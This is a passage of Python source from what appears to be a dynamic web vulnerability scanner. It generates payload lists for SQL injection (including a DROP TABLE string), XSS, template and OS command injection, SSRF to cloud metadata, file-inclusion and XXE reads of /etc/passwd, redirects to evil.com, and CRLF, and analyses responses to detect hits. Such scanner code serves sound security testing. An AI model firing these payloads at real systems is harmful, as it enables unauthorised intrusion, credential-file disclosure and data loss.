        payloads.extend(self._generate_xxe_payloads(param))

        for vuln_type, custom in self._custom_payloads.items():
            payloads.extend(custom)

        if self._encoding_variants:
            encoded = self._generate_encoding_variants(payloads)
            payloads.extend(encoded)

        seen: Set[str] = set()
        unique: List[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        payloads = unique

        with self._lock:
            self._total_generated += len(payloads)
            self._payload_cache[cache_key] = payloads

        return payloads

    def _generate_sqli_payloads(self, param: Parameter) -> List[str]:
        """Generate SQL injection payloads."""
        payloads: List[str] = []
        val = param.value or "1"

        error_based = [
            f"{val}'",
            f'{val}"',
            f"{val}' OR '1'='1",
            f'{val}" OR "1"="1',
            f"{val}' OR '1'='1'--",
            f"{val}' OR '1'='1'/*",
            f"{val}' AND '1'='2",
            f"{val}' UNION SELECT NULL--",
            f"{val}' UNION SELECT NULL,NULL--",
            f"{val}' UNION SELECT NULL,NULL,NULL--",
            f"{val}) OR ('1'='1",
            f"{val}')) OR (('1'='1",
            f"{val}' ORDER BY 1--",
            f"{val}' ORDER BY 10--",
            f"{val}' ORDER BY 100--",
            "1; SELECT 1--",
            "1'; WAITFOR DELAY '0:0:0'--",
            f"{val}' AND 1=CONVERT(int,(SELECT @@version))--",
            f"{val}' AND extractvalue(1,concat(0x7e,version()))--",
            f"{val}\\",
            f"{val}'||'",
            f"{val}' AND '1'='1' AND ''='",
        ]
        payloads.extend(error_based)

        time_based = [
            f"{val}' AND SLEEP(5)--",
            f"{val}' AND SLEEP(5)#",
            f"{val}'; WAITFOR DELAY '0:0:5'--",
            f"{val}' AND pg_sleep(5)--",
            f"{val}' || pg_sleep(5)--",
            f"{val}' AND BENCHMARK(5000000,SHA1('test'))--",
            f"{val}'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            f"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            f"1; WAITFOR DELAY '0:0:5'--",
        ]
        payloads.extend(time_based)

        boolean_based = [
            f"{val}' AND 1=1--",
            f"{val}' AND 1=2--",
            f"{val}' AND SUBSTRING(@@version,1,1)='5'--",
            f"{val}' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            f"{val} AND 1=1",
            f"{val} AND 1=2",
        ]
        payloads.extend(boolean_based)

        if self._scan_mode == ScanMode.AGGRESSIVE:
            aggressive = [
                f"{val}' UNION SELECT table_name,NULL FROM information_schema.tables--",
                f"{val}' UNION SELECT column_name,NULL FROM information_schema.columns--",
                f"{val}'; DROP TABLE test--",
                f"{val}' AND updatexml(1,concat(0x7e,version(),0x7e),1)--",
                f"{val}' AND exp(~(SELECT * FROM (SELECT version())a))--",
                "' OR 1=1 LIMIT 1--",
                "admin'--",
                "' OR ''='",
            ]
            payloads.extend(aggressive)

        return payloads

    def _generate_xss_payloads(self, param: Parameter) -> List[str]:
        """Generate XSS payloads with canary for reflection detection."""
        canary = self.CANARY
        payloads = [
            f"<script>{canary}</script>",
            f"<img src=x onerror={canary}>",
            f"<svg onload={canary}>",
            f'"><script>{canary}</script>',
            f"'><script>{canary}</script>",
            f"<img src=x onerror=alert('{canary}')>",
            f"<body onload={canary}>",
            f'"><img src=x onerror={canary}>',
            f"javascript:{canary}",
            f"<iframe src=\"javascript:{canary}\">",
            f"<details open ontoggle={canary}>",
            f"<marquee onstart={canary}>",
            f"{{{{constructor.constructor('return this')().alert('{canary}')}}}}",
            f"<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror={canary}>",
            f"%3Cscript%3E{canary}%3C/script%3E",
            f"<ScRiPt>{canary}</ScRiPt>",
            f"<scr<script>ipt>{canary}</scr</script>ipt>",
            f"<svg/onload={canary}>",
            f"'-alert('{canary}')-'",
            f"\";alert('{canary}');//",
            f"</title><script>{canary}</script>",
            f"</textarea><script>{canary}</script>",
            canary,
        ]

        if self._scan_mode in (ScanMode.AGGRESSIVE, ScanMode.NORMAL):
            payloads.extend([
                f"<a href=\"javascript:void(0)\" onclick=\"{canary}\">click</a>",
                f"<input onfocus={canary} autofocus>",
                f"<select onfocus={canary} autofocus>",
                f"<video><source onerror={canary}>",
                f"<audio src=x onerror={canary}>",
                f"<object data=\"javascript:{canary}\">",
                f"<isindex action=\"javascript:{canary}\">",
            ])

        return payloads

    def _generate_ssti_payloads(self, param: Parameter) -> List[str]:
        """Generate Server-Side Template Injection payloads."""
        canary = self.CANARY
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{7*'7'}}",
            "{%import os%}{{os.popen('id').read()}}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__}}",
            "#{`id`}",
            "*{T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{constructor.constructor('return this')()}}",
            "@(1+2)",
            "[[${7*7}]]",
            f"${{'{canary}'}}",
            "{{49}}",
        ]
        return payloads

    def _generate_command_injection_payloads(self, param: Parameter) -> List[str]:
        """Generate OS command injection payloads."""
        val = param.value or "test"
        payloads = [
            f"{val};id",
            f"{val}|id",
            f"{val}`id`",
            f"{val}$(id)",
            f"{val};cat /etc/passwd",
            f"{val}|cat /etc/passwd",
            f"{val};whoami",
            f"{val}|whoami",
            f"{val}`whoami`",
            f"{val}$(whoami)",
            f"{val}&&id",
            f"{val}||id",
            f"{val}%0aid",
            f"{val}\nid",
            f"{val};ping -c 3 127.0.0.1",
            f"{val}|ping -c 3 127.0.0.1",
            f"{val};sleep 5",
            f"{val}|sleep 5",
            f"{val}`sleep 5`",
            f"{val}$(sleep 5)",
            f"{val}&ping -n 5 127.0.0.1&",
            f"{val}|timeout /t 5",
        ]
        return payloads

    def _generate_ssrf_payloads(self, param: Parameter) -> List[str]:
        """Generate SSRF payloads."""
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://[::1]",
            "http://0x7f000001",
            "http://0177.0.0.1",
            "http://2130706433",
            "http://169.254.169.254",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/INFO",
            "http://0.0.0.0",
            "http://localtest.me",
            "http://127.1",
            "http://127.0.0.1.nip.io",
        ]
        return payloads

    def _generate_open_redirect_payloads(self, param: Parameter) -> List[str]:
        """Generate open redirect payloads."""
        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%2f%2f",
            "/%0d/evil.com",
            "/.evil.com",
            "///evil.com",
            "////evil.com",
            "https:evil.com",
            r"\/\/evil.com",
            "https://evil.com@legitimate.com",
            "https://legitimate.com.evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "/redirect?url=https://evil.com",
            "https://evil.com%00.legitimate.com",
        ]
        return payloads

    def _generate_lfi_payloads(self, param: Parameter) -> List[str]:
        """Generate Local File Inclusion payloads."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\etc\\passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.html",
            "....//....//....//etc//passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "expect://id",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        ]
        return payloads

    def _generate_path_traversal_payloads(self, param: Parameter) -> List[str]:
        """Generate path traversal payloads."""
        depths = ["../", "..\\", "....//", "..%2f", "..%5c"]
        targets = ["etc/passwd", "etc/hosts", "windows/win.ini",
                    "windows/system32/drivers/etc/hosts"]
        payloads: List[str] = []
        for depth_str in depths:
            for target in targets:
                for count in (3, 5, 8, 12):
                    payloads.append(depth_str * count + target)
        return payloads

    def _generate_idor_payloads(self, param: Parameter) -> List[str]:
        """Generate IDOR payloads for numeric parameters."""
        payloads: List[str] = []
        try:
            original = int(param.value) if param.value else 1
        except ValueError:
            original = 1

        for offset in [-1, 0, 1, 2, -2, 10, 100, 999, -999]:
            val = original + offset
            if val != original:
                payloads.append(str(val))

        payloads.extend(["0", "-1", "99999999", "2147483647", "-2147483648"])
        return payloads

    def _generate_crlf_payloads(self, param: Parameter) -> List[str]:
        """Generate CRLF injection payloads."""
        payloads = [
            "%0d%0aInjected-Header:SirenTest",
            "%0d%0a%0d%0a<script>alert(1)</script>",
            "%0aInjected-Header:SirenTest",
            "%0dInjected-Header:SirenTest",
            "\\r\\nInjected-Header:SirenTest",
            "%E5%98%8A%E5%98%8DInjected-Header:SirenTest",
            "%0d%0aContent-Length:0%0d%0a%0d%0a",
            "%0d%0aSet-Cookie:siren=test",
        ]
        return payloads

    def _generate_xxe_payloads(self, param: Parameter) -> List[str]:
        """Generate XXE payloads for XML-accepting parameters."""
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/test"> %xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        ]
        return payloads

    def _generate_encoding_variants(self, base_payloads: List[str]) -> List[str]:
        """Generate URL-encoded and double-encoded variants of payloads."""
        variants: List[str] = []
        sample = base_payloads[:10]

        for payload in sample:
            url_encoded = urllib.parse.quote(payload, safe="")
            if url_encoded != payload:
                variants.append(url_encoded)

            double_encoded = urllib.parse.quote(url_encoded, safe="")
            if double_encoded != url_encoded:
                variants.append(double_encoded)

        return variants

    def generate_canary_payload(self) -> str:
        """Return the canary string for reflection checking."""
        return self.CANARY

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return {
                "total_generated": self._total_generated,
                "cache_size": len(self._payload_cache),
            }


# ════════════════════════════════════════════════════════════════════════════════
# RESPONSE ANALYZER
# ════════════════════════════════════════════════════════════════════════════════

class ResponseAnalyzer:
    """
    Analyzes HTTP responses for signs of vulnerabilities.

    Detection methods:
      - Error-based: SQL errors, stack traces, debug info
      - Time-based: response time comparison with baseline
      - Content-diff: compare fuzzed vs baseline body
      - Reflection: detect payload reflection for XSS
      - Status code: unusual codes indicating issues
      - Header analysis: security headers, info disclosure

    Usage:
        analyzer = ResponseAnalyzer()
        result = analyzer.analyze(response, baseline, payload, param_name)
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._sql_patterns = [(re.compile(p, re.IGNORECASE), db) for p, db in SQL_ERROR_PATTERNS]
        self._stack_patterns = [re.compile(p, re.IGNORECASE) for p in STACK_TRACE_PATTERNS]
        self._debug_patterns = [re.compile(p, re.IGNORECASE) for p in DEBUG_INFO_PATTERNS]
        self._xss_contexts = [(re.compile(p, re.IGNORECASE), ctx) for p, ctx in XSS_REFLECTION_CONTEXTS]
        self._canary = DynamicPayloadGenerator.CANARY
        self._total_analyzed: int = 0
        self._total_detections: int = 0
        logger.info("ResponseAnalyzer initialized")

    def analyze(
        self,
        response: HttpResponse,
        baseline: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """
        Analyze a response for anomalies indicating vulnerabilities.

        Returns a dict with type, details, vuln_type, confidence if
        an anomaly is detected, or None if clean.
        """
        with self._lock:
            self._total_analyzed += 1

        if response.error:
            return None

        result = self._detect_sql_errors(response, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        result = self._detect_time_based(response, baseline, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        result = self._detect_reflection(response, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        result = self._detect_stack_trace(response, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        result = self._detect_debug_info(response, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        result = self._detect_content_diff(response, baseline, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        result = self._detect_status_anomaly(response, baseline, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        result = self._detect_header_anomaly(response, payload, param_name)
        if result:
            with self._lock:
                self._total_detections += 1
            return result

        return None

    def _detect_sql_errors(
        self,
        response: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect SQL error messages in response body."""
        body = response.body
        for pattern, db_type in self._sql_patterns:
            match = pattern.search(body)
            if match:
                evidence = match.group(0)[:200]
                return {
                    "type": "sql_error",
                    "details": f"SQL error detected ({db_type}): {evidence}",
                    "vuln_type": VulnType.SQLI_ERROR,
                    "confidence": 0.90,
                    "db_type": db_type,
                    "evidence": evidence,
                }
        return None

    def _detect_time_based(
        self,
        response: HttpResponse,
        baseline: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect time-based blind vulnerabilities."""
        if baseline.elapsed <= 0:
            return None

        time_diff = response.elapsed - baseline.elapsed
        threshold = max(
            baseline.elapsed * TIME_THRESHOLD_MULTIPLIER,
            MIN_TIME_DIFF_SECONDS,
        )

        if time_diff >= threshold:
            is_sleep = any(kw in payload.lower() for kw in [
                "sleep", "waitfor", "pg_sleep", "benchmark", "delay",
            ])
            is_cmd_sleep = any(kw in payload.lower() for kw in [
                "sleep 5", "timeout", "ping -c",
            ])

            vuln_type = VulnType.SQLI_BLIND_TIME
            confidence = 0.70
            if is_sleep:
                confidence = 0.85
            if is_cmd_sleep:
                vuln_type = VulnType.COMMAND_INJECTION
                confidence = 0.75

            return {
                "type": "time_based",
                "details": (
                    f"Response time anomaly: {response.elapsed:.2f}s "
                    f"vs baseline {baseline.elapsed:.2f}s "
                    f"(diff: {time_diff:.2f}s, threshold: {threshold:.2f}s)"
                ),
                "vuln_type": vuln_type,
                "confidence": confidence,
                "response_time": response.elapsed,
                "baseline_time": baseline.elapsed,
            }
        return None

    def _detect_reflection(
        self,
        response: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect payload reflection (XSS indicators)."""
        body = response.body

        if self._canary in body:
            for pattern, context in self._xss_contexts:
                match = pattern.search(body)
                if match:
                    return {
                        "type": "reflection",
                        "details": f"Canary reflected in {context} context",
                        "vuln_type": VulnType.XSS_REFLECTED,
                        "confidence": 0.90 if context in ("script_block", "event_handler") else 0.75,
                        "context": context,
                        "evidence": match.group(0)[:200],
                    }

            return {
                "type": "reflection",
                "details": "Canary reflected in response body (context undetermined)",
                "vuln_type": VulnType.XSS_REFLECTED,
                "confidence": 0.60,
            }

        dangerous_reflections = [
            "<script", "<img", "<svg", "<iframe", "<body",
            "onerror=", "onload=", "onclick=", "onfocus=",
            "javascript:", "vbscript:",
        ]
        for tag in dangerous_reflections:
            if tag in payload.lower() and tag in body.lower():
                escaped = html.escape(tag)
                if tag in body and escaped not in body:
                    return {
                        "type": "reflection",
                        "details": f"Unescaped reflection of '{tag}' in response",
                        "vuln_type": VulnType.XSS_REFLECTED,
                        "confidence": 0.70,
                    }

        return None

    def _detect_stack_trace(
        self,
        response: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect stack traces in response."""
        body = response.body
        for pattern in self._stack_patterns:
            match = pattern.search(body)
            if match:
                return {
                    "type": "stack_trace",
                    "details": f"Stack trace detected: {match.group(0)[:200]}",
                    "vuln_type": VulnType.INFO_DISCLOSURE,
                    "confidence": 0.80,
                    "evidence": match.group(0)[:300],
                }
        return None

    def _detect_debug_info(
        self,
        response: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect debug information in response."""
        body = response.body
        for pattern in self._debug_patterns:
            match = pattern.search(body)
            if match:
                return {
                    "type": "debug_info",
                    "details": f"Debug/sensitive info detected: {match.group(0)[:200]}",
                    "vuln_type": VulnType.SENSITIVE_DATA_EXPOSURE,
                    "confidence": 0.75,
                    "evidence": match.group(0)[:300],
                }
        return None

    def _detect_content_diff(
        self,
        response: HttpResponse,
        baseline: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect significant content differences from baseline."""
        if not baseline.body or not response.body:
            return None

        baseline_len = len(baseline.body)
        response_len = len(response.body)
        if baseline_len == 0:
            return None

        size_ratio = abs(response_len - baseline_len) / max(baseline_len, 1)

        if size_ratio > 3.0 and response_len > baseline_len:
            lfi_indicators = [
                "root:", "/bin/bash", "/bin/sh", "/sbin/nologin",
                "[extensions]", "; for 16-bit app support",
                "daemon:", "nobody:", "www-data:",
            ]
            for indicator in lfi_indicators:
                if indicator in response.body and indicator not in baseline.body:
                    return {
                        "type": "content_diff",
                        "details": f"LFI indicator '{indicator}' in response (size ratio: {size_ratio:.1f}x)",
                        "vuln_type": VulnType.LFI,
                        "confidence": 0.85,
                        "evidence": indicator,
                    }

        ssti_markers = ["49", "7777777"]
        for marker in ssti_markers:
            if ("7*7" in payload or "7*'7'" in payload) and marker in response.body:
                if marker not in baseline.body:
                    return {
                        "type": "content_diff",
                        "details": f"SSTI computation result '{marker}' detected",
                        "vuln_type": VulnType.SSTI,
                        "confidence": 0.85,
                    }

        boolean_payloads = ["AND 1=1", "AND 1=2", "OR '1'='1", "OR '1'='2"]
        for bp in boolean_payloads:
            if bp in payload:
                body_hash_base = hashlib.md5(baseline.body.encode()).hexdigest()
                body_hash_resp = hashlib.md5(response.body.encode()).hexdigest()
                if body_hash_base != body_hash_resp and size_ratio > 0.1:
                    return {
                        "type": "content_diff",
                        "details": (
                            f"Boolean-based content change with payload containing '{bp}' "
                            f"(size diff: {abs(response_len - baseline_len)} bytes)"
                        ),
                        "vuln_type": VulnType.SQLI_BLIND_BOOLEAN,
                        "confidence": 0.55,
                    }

        return None

    def _detect_status_anomaly(
        self,
        response: HttpResponse,
        baseline: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect anomalous status codes."""
        status = response.status_code
        base_status = baseline.status_code

        if status == 500 and base_status != 500:
            vuln_type = VulnType.INFO_DISCLOSURE
            confidence = 0.50

            if any(kw in payload for kw in ["'", '"', "\\", ";", "|", "`"]):
                vuln_type = VulnType.SQLI
                confidence = 0.55
            if any(kw in payload for kw in [";id", "|id", "$(", "`"]):
                vuln_type = VulnType.COMMAND_INJECTION
                confidence = 0.55

            return {
                "type": "status_code",
                "details": f"Server error (500) triggered by payload (baseline: {base_status})",
                "vuln_type": vuln_type,
                "confidence": confidence,
            }

        if status in (301, 302, 303, 307, 308) and base_status not in (301, 302, 303, 307, 308):
            location = response.headers.get("location", "")
            if any(evil in location.lower() for evil in ["evil.com", "attacker", "javascript:"]):
                return {
                    "type": "status_code",
                    "details": f"Open redirect detected: redirects to {location}",
                    "vuln_type": VulnType.OPEN_REDIRECT,
                    "confidence": 0.85,
                }

        if status == 403 and base_status == 200:
            return {
                "type": "status_code",
                "details": "Payload blocked by WAF/security filter (403 Forbidden)",
                "vuln_type": VulnType.SECURITY_MISCONFIGURATION,
                "confidence": 0.30,
            }

        return None

    def _detect_header_anomaly(
        self,
        response: HttpResponse,
        payload: str,
        param_name: str,
    ) -> Optional[Dict[str, Any]]:
        """Detect anomalous or missing security headers."""
        headers = response.headers

        for header_name, desc in SENSITIVE_HEADERS.items():
            if header_name in headers:
                return {
                    "type": "header_info",
                    "details": f"{desc}: {headers[header_name]}",
                    "vuln_type": VulnType.INFO_DISCLOSURE,
                    "confidence": 0.40,
                }

        crlf_indicators = ["injected-header", "sirentest"]
        for key in headers:
            if any(ind in key.lower() for ind in crlf_indicators):
                return {
                    "type": "crlf",
                    "details": f"CRLF injection detected: injected header '{key}'",
                    "vuln_type": VulnType.CRLF_INJECTION,
                    "confidence": 0.90,
                }
        for val in headers.values():
            if any(ind in val.lower() for ind in crlf_indicators):
                return {
                    "type": "crlf",
                    "details": "CRLF injection detected: injected header value",
                    "vuln_type": VulnType.CRLF_INJECTION,
                    "confidence": 0.90,
                }

        return None

    def analyze_security_headers(self, response: HttpResponse) -> List[Dict[str, Any]]:
        """Analyze response for missing security headers."""
        issues: List[Dict[str, Any]] = []
        for header, desc in SECURITY_HEADERS_EXPECTED.items():
            if header not in response.headers:
                issues.append({
                    "type": "missing_header",
                    "header": header,
                    "details": desc,
                    "vuln_type": VulnType.SECURITY_MISCONFIGURATION,
                    "confidence": 0.60,
                })

        cors_header = response.headers.get("access-control-allow-origin", "")
        if cors_header == "*":
            issues.append({
                "type": "cors",
                "details": "Wildcard CORS: Access-Control-Allow-Origin: *",
                "vuln_type": VulnType.CORS_MISCONFIGURATION,
                "confidence": 0.70,
            })

        return issues

    def detect_csrf_vulnerability(
        self,
        form: FormData,
        response: HttpResponse,
    ) -> Optional[Dict[str, Any]]:
        """Check if a form is vulnerable to CSRF."""
        if form.method == HttpMethod.GET:
            return None

        if form.has_csrf_token:
            return None

        origin_check = False
        referer_check = False
        samesite = False

        cookies_header = response.headers.get("set-cookie", "").lower()
        if "samesite=strict" in cookies_header or "samesite=lax" in cookies_header:
            samesite = True

        if not origin_check and not referer_check and not samesite:
            return {
                "type": "csrf",
                "details": f"Form at {form.action} ({form.method.value}) lacks CSRF protection",
                "vuln_type": VulnType.CSRF,
                "confidence": 0.70,
            }

        return None

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return {
                "total_analyzed": self._total_analyzed,
                "total_detections": self._total_detections,
            }


# ════════════════════════════════════════════════════════════════════════════════
# SESSION MANAGER
# ════════════════════════════════════════════════════════════════════════════════

class SessionManager:
    """
    Manages authentication sessions for DAST scanning.

    Handles cookie jars, token refresh, login sequence replay,
    and session validation checks.

    Usage:
        session = SessionManager(http_client)
        session.set_login_sequence(login_url, credentials)
        session.authenticate()
        if not session.is_session_valid():
            session.re_authenticate()
    """

    def __init__(self, http_client: Optional[_HttpClient] = None) -> None:
        self._lock = threading.RLock()
        self._client: _HttpClient = http_client or _HttpClient()
        self._login_url: str = ""
        self._login_method: HttpMethod = HttpMethod.POST
        self._credentials: Dict[str, str] = {}
        self._login_headers: Dict[str, str] = {}
        self._session_cookies: Dict[str, str] = {}
        self._auth_token: str = ""
        self._auth_header_name: str = "Authorization"
        self._auth_header_prefix: str = "Bearer"
        self._token_refresh_url: str = ""
        self._refresh_token: str = ""
        self._session_check_url: str = ""
        self._session_check_string: str = ""
        self._session_check_status: int = 200
        self._is_authenticated: bool = False
        self._login_sequence: List[Dict[str, Any]] = []
        self._auth_attempts: int = 0
        self._max_auth_attempts: int = 3
        self._last_auth_time: float = 0.0
        self._session_timeout: float = 3600.0
        self._csrf_extraction_enabled: bool = True
        self._form_extractor: FormExtractor = FormExtractor()
        logger.info("SessionManager initialized")

    def set_login_sequence(
        self,
        login_url: str,
        credentials: Dict[str, str],
        method: HttpMethod = HttpMethod.POST,
        headers: Optional[Dict[str, str]] = None,
    ) -> None:
        """Configure simple login sequence."""
        with self._lock:
            self._login_url = login_url
            self._credentials = credentials
            self._login_method = method
            self._login_headers = headers or {}

    def set_multi_step_login(self, steps: List[Dict[str, Any]]) -> None:
        """
        Configure multi-step login sequence.

        Each step is a dict with keys:
          url, method, body (dict), headers (dict),
          extract_csrf (bool), csrf_field (str),
          expect_status (int), extract_cookie (str),
          extract_token_from (str), token_regex (str)
        """
        with self._lock:
            self._login_sequence = steps

    def set_token_auth(
        self,
        header_name: str = "Authorization",
        prefix: str = "Bearer",
    ) -> None:
        """Configure token-based auth header."""
        with self._lock:
            self._auth_header_name = header_name
            self._auth_header_prefix = prefix

    def set_token_refresh(self, refresh_url: str, refresh_token: str = "") -> None:
        """Configure token refresh endpoint."""
        with self._lock:
            self._token_refresh_url = refresh_url
            self._refresh_token = refresh_token

    def set_session_check(
        self,
        check_url: str,
        expect_string: str = "",
        expect_status: int = 200,
    ) -> None:
        """Configure session validation check."""
        with self._lock:
            self._session_check_url = check_url
            self._session_check_string = expect_string
            self._session_check_status = expect_status

    def set_session_timeout(self, seconds: float) -> None:
        with self._lock:
            self._session_timeout = seconds

    def authenticate(self) -> bool:
        """Execute login sequence and establish session."""
        with self._lock:
            if self._auth_attempts >= self._max_auth_attempts:
                logger.error("Max auth attempts (%d) reached", self._max_auth_attempts)
                return False
            self._auth_attempts += 1

        if self._login_sequence:
            return self._execute_multi_step_login()

        if not self._login_url:
            logger.warning("No login URL configured")
            return False

        logger.info("Authenticating to %s", self._login_url)

        csrf_token_name = ""
        csrf_token_value = ""
        if self._csrf_extraction_enabled:
            get_resp = self._client.request("GET", self._login_url)
            if not get_resp.error:
                csrf = self._form_extractor.extract_csrf_token(get_resp.body)
                if csrf:
                    csrf_token_name, csrf_token_value = csrf
                    logger.debug("Extracted CSRF token: %s", csrf_token_name)

        body_params = dict(self._credentials)
        if csrf_token_name:
            body_params[csrf_token_name] = csrf_token_value

        body = urllib.parse.urlencode(body_params)
        headers = dict(self._login_headers)
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

        response = self._client.request(
            self._login_method.value,
            self._login_url,
            body=body,
            headers=headers,
        )

        if response.error:
            logger.error("Authentication failed: %s", response.error)
            return False

        if response.status_code in (200, 301, 302, 303):
            with self._lock:
                self._session_cookies = self._client.get_cookies()
                self._is_authenticated = True
                self._last_auth_time = time.time()

            self._extract_auth_token(response)

            logger.info("Authentication successful (status: %d)", response.status_code)
            return True

        logger.warning("Authentication may have failed (status: %d)", response.status_code)
        return False

    def _execute_multi_step_login(self) -> bool:
        """Execute a multi-step login sequence."""
        logger.info("Executing multi-step login (%d steps)", len(self._login_sequence))

        extracted_tokens: Dict[str, str] = {}

        for idx, step in enumerate(self._login_sequence):
            url = step.get("url", "")
            method = step.get("method", "POST")
            body_template: Dict[str, str] = step.get("body", {})
            step_headers: Dict[str, str] = step.get("headers", {})
            extract_csrf = step.get("extract_csrf", False)
            csrf_field = step.get("csrf_field", "")
            expect_status = step.get("expect_status", 200)
            extract_cookie = step.get("extract_cookie", "")
            token_from = step.get("extract_token_from", "")
            token_regex = step.get("token_regex", "")

            if extract_csrf:
                get_resp = self._client.request("GET", url)
                if not get_resp.error:
                    csrf = self._form_extractor.extract_csrf_token(get_resp.body)
                    if csrf:
                        extracted_tokens[csrf_field or csrf[0]] = csrf[1]

            body_params: Dict[str, str] = {}
            for k, v in body_template.items():
                if v.startswith("$"):
                    token_key = v[1:]
                    body_params[k] = extracted_tokens.get(token_key, v)
                else:
                    body_params[k] = v

            for k, v in extracted_tokens.items():
                if k not in body_params:
                    body_params[k] = v

            body = urllib.parse.urlencode(body_params) if body_params else None
            step_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

            response = self._client.request(method, url, body=body, headers=step_headers)

            if response.error:
                logger.error("Multi-step login failed at step %d: %s", idx, response.error)
                return False

            if expect_status and response.status_code != expect_status:
                if response.status_code not in (301, 302, 303):
                    logger.warning("Step %d returned %d (expected %d)",
                                   idx, response.status_code, expect_status)

            if extract_cookie:
                cookies = self._client.get_cookies()
                if extract_cookie in cookies:
                    extracted_tokens[extract_cookie] = cookies[extract_cookie]

            if token_from and token_regex:
                match = re.search(token_regex, response.body)
                if match:
                    extracted_tokens[token_from] = match.group(1)

            self._extract_auth_token(response)

            logger.debug("Multi-step login step %d complete (status: %d)", idx, response.status_code)

        with self._lock:
            self._session_cookies = self._client.get_cookies()
            self._is_authenticated = True
            self._last_auth_time = time.time()

        logger.info("Multi-step authentication successful")
        return True

    def _extract_auth_token(self, response: HttpResponse) -> None:
        """Extract auth token from response headers or body."""
        auth_header = response.headers.get("authorization", "")
        if auth_header:
            with self._lock:
                self._auth_token = auth_header
            return

        token_patterns = [
            re.compile(r'"(?:access_token|token|jwt|auth_token)"\s*:\s*"([^"]+)"', re.IGNORECASE),
            re.compile(r"'(?:access_token|token|jwt|auth_token)'\s*:\s*'([^']+)'", re.IGNORECASE),
        ]
        for pattern in token_patterns:
            match = pattern.search(response.body)
            if match:
                with self._lock:
                    self._auth_token = match.group(1)

                refresh_patterns = [
                    re.compile(r'"refresh_token"\s*:\s*"([^"]+)"', re.IGNORECASE),
                ]
                for rp in refresh_patterns:
                    rm = rp.search(response.body)
                    if rm:
                        with self._lock:
                            self._refresh_token = rm.group(1)
                return

    def is_session_valid(self) -> bool:
        """Check if current session is still valid."""
        with self._lock:
            if not self._is_authenticated:
                return False

            if self._session_timeout > 0:
                elapsed = time.time() - self._last_auth_time
                if elapsed > self._session_timeout:
                    logger.info("Session timeout exceeded (%.0fs > %.0fs)", elapsed, self._session_timeout)
                    self._is_authenticated = False
                    return False

        if self._session_check_url:
            response = self._client.request("GET", self._session_check_url)
            if response.error:
                return False

